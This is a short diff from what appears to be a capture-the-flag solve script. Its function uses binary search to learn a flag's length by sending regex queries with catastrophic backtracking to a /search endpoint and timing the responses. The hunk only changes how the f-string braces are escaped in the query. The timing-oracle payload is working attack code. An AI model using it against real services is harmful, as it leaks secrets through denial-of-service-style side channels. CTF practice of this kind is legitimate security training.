@@ -151,7 +151,7 @@ def leak_flag_length():
     left, right = 0, 64,
     while left <= right:
         idx = (left + right) // 2
-        data = {"query": f"/^(?=uoftctf{{.{{{idx},}}}})((.*)*)*donotexist/","language":"All"}
+        data = {"query": f"/^(?=uoftctf.{{{{{idx},}}}})((.*)*)*donotexist/","language":"All"}
 
         r = requests.post(f'{url}/search', json=data)
         elapsed = r.elapsed.total_seconds()
